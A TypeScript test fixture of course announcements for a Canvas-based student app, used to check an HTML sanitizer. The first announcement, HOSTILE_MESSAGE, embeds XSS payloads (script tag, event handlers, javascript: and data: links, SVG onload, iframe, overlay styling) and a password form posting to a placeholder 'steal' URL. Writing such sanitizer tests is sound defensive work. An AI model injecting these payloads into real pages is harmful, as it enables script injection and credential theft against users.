/**
 * The announcements of the scenario, as `GET /api/v1/courses/:id/discussion_topics/:id` and
 * `GET /api/v1/announcements` return them. The first one carries markup that a hostile or careless
 * teacher could post: the sanitizer must keep its text and links and drop the rest.
 */
import type { AnnouncementTopic } from '../../src/shared/canvas/types';

export interface AnnouncementFixture extends AnnouncementTopic {
  courseId: string;
  /** Whether the student has read it when the scenario starts. */
  read: boolean;
}

/** HTML with every kind of trouble the sanitizer must handle, around some good content. */
export const HOSTILE_MESSAGE = [
  '<p>The lab section moves to <strong>Science Hall 214</strong> on Thursday.</p>',
  '<p>Read the <a href="/courses/101/pages/lab-safety">lab safety page</a> and the ',
  '<a href="https://example.org/map">building map</a> first.</p>',
  '<ul><li>Bring your goggles</li><li>Bring your notebook</li></ul>',
  '<table><tr><th>Group</th><th>Room</th></tr><tr><td>A</td><td>214</td></tr></table>',
  '<script>window.__pwned = 1;</script>',
  '<img src="https://example.org/missing.png" onerror="window.__pwned = 2" alt="logo">',
  '<p onclick="window.__pwned = 3" style="position:fixed;top:0;left:0;width:9999px;height:9999px">',
  'Click for the <a href="javascript:window.__pwned = 4">party</a> or the ',
  '<a href="data:text/html,<script>window.__pwned=5</script>">other party</a>.</p>',
  '<iframe src="https://example.org/frame"></iframe>',
  '<form action="https://example.org/steal"><input name="password"><button>Send</button></form>',
  '<svg onload="window.__pwned = 6"><a xlink:href="javascript:window.__pwned = 7"><text>x</text></a></svg>',
].join('');

export const ANNOUNCEMENTS: readonly AnnouncementFixture[] = [
  {
    id: '31901',
    courseId: '101',
    title: 'Lab room change for Thursday',
    message: HOSTILE_MESSAGE,
    posted_at: '2026-10-27T16:00:00Z',
    read: false,
    user_name: 'Dr. Maya Okafor',
  },
  {
    id: '31002',
    courseId: '101',
    title: 'Syllabus quiz reminder',
    message: '<p>The syllabus quiz closes on Friday.</p>',
    posted_at: '2026-10-20T14:00:00Z',
    read: true,
    user_name: 'Dr. Maya Okafor',
  },
  {
    id: '31003',
    courseId: '101',
    title: 'Welcome to BIO 110',
    message: '<p>Welcome. The first lab starts in week two.</p>',
    posted_at: '2026-09-02T14:00:00Z',
    read: false,
    user_name: 'Dr. Maya Okafor',
  },
  {
    id: '32901',
    courseId: '102',
    title: 'Office hours move to Thursday this week',
    message: '<p>Office hours move to <em>Thursday</em>, 3pm to 4pm.</p>',
    posted_at: '2026-10-27T15:00:00Z',
    read: false,
    user_name: 'Prof. Ines Duarte',
  },
  {
    id: '34901',
    courseId: '104',
    title: 'Safety goggles are required',
    message: '<p>Everyone needs splash goggles for Lab 7.</p>',
    posted_at: '2026-10-26T15:00:00Z',
    read: false,
    user_name: 'Sam Whitaker',
  },
];
